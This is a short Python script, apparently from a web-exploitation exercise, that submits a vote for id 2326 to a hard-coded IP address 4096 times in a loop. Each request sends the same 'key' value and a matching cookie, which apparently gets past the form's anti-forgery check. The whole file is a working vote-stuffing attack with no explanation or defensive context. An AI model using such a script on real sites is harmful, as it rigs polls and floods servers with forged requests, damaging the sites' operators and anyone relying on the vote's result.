#!/usr/bin/python3
"""Module to automatically vote for id 2326, 4096 times """
import requests
"""
To add HTTP headers to a request, you can simply pass them in a
dict to the headers parameter. Similarly, you can also send your own
cookies to a server using a dict passed to the cookies parameter.
"""

url = 'http://158.69.76.135/level1.php'

for i in range(4096):
    passValues = {'id': '2326', 'holdthedoor': 'Submit', 'key': 'freshCookie'}
    kookies = {'HoldTheDoor': 'freshCookie'}
    r = requests.post(url, data=passValues, cookies=kookies)

print(r.status_code)
